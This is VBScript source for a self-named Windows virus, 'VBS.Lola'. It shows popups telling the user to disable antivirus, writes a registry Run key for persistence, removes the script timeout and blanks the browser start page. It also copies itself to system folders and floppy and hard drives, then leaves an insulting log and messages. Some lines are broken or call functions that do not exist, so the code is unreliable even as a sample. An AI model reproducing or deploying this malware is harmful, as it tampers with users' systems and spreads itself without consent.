'********************************************VBS.Lola*******************************************************
On Error Resume Next
msgBox "Salut !!!"
msgBox "Attention veillez à désactiver votre antivirus !!"
Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\VBS.Lola.txt", "c:\windows\system\Lola.txt.vbs"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout", "0", "REG_DWORD"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
On Error Resume Next
set fso = CreateObject("Scripting.FileSystemObject")
set dirsystem = fso.getSpecialFolder(1)
set abc = fso.CreatetextFile(dirsystem&".vbs")
set shell = CreateObject("Wscript.Shell")
Lola.txtcopy = file.ReadAll
set c= fso.GetFile(WScript.ScriptFullName)
c.copy(dirsystem&"\Lola.txt.vbs")
c.copy("a:\Lola.txt.vbs")
c.copy("b:\Lola.txt.vbs")
c.copy("c:\windows\Lola.txt.vbs")
c.copy("c:\windows\command\Lola.txt.vbs")
if fileexist(dirsystem&"\Lola.txt.vbs") = 0 Then
abc.write Lola.txtcopy
abc.close
End If
On Error Resume Next
Set bmw = CreateObject("Scripting.FileSystemObject")
Set repwin = bmw.getSpecialFolder(0)
bmw.DeleteFile "c:\windows\Lolalog.txt", True
Set b = fso.CreateTextFile("c:\windows\Lolalog.txt", True)
b.WriteLine("Made in France, virus his name is VBS.Lola")
msgBox "Fuck you !!"
msgBox "My name is VBS.Lola"
'*******************************************VBS.Lola********************************************************